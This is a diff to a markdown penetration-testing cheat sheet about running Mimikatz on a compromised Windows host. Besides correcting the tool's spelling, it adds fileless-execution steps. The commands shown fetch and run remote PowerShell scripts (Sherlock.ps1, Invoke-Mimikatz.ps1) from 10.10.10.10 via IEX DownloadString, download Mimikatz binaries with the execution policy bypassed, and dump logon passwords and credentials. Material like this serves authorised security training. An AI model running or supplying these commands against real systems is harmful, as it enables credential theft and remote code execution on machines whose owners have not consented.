@@ -203,15 +203,15 @@ Or from a Windows Powershell:
 IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
 ```
 
-## Running Mimicatz
+## Running Mimikatz
 Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.  
 https://github.com/gentilkiwi/mimikatz  
 
-### Running traditional (binary) Mimicatz
-The original and most frequently updated version of Mimicatz is the binary executable which can be found here:  
+### Running traditional (binary) Mimikatz
+The original and most frequently updated version of Mimikatz is the binary executable which can be found here:  
 https://github.com/gentilkiwi/mimikatz/releases  
 
-First we will need to download a Mimicatz binary and copy it to the remote machine
+First we will need to download a Mimikatz binary and copy it to the remote machine
 ```
 root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip     
 --2018-10-16 15:14:49--  https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip                     
@@ -221,7 +221,7 @@ Now we will need to copy the 3 files (win32 or x64 depending on the OS) required
 ```
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"
 ```
-Now, if we dont have an overly interactive shell, we will want to execute Mimicatz without the built in CLI by passing the correct parameters to the executable.  We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
+Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable.  We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
 ```
 mimikatz log version "sekurlsa::logonpasswords" exit
 ```
@@ -234,11 +234,15 @@ mimikatz # sekurlsa::logonpasswords
 ```
 
 
-### Running Powershell Mimicatz
-The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD.  This version simply reflectively loads the Mimicatz binary into memory so we could probably update it ourselves without much difficulty. 
+### Running Powershell Mimikatz
+The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution).  This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty. 
 
 ```
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
+```
+Fileless execution of Mimikatz from remotely hosted server:
+```
+IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
 
 ## Windows Kernel Exploits
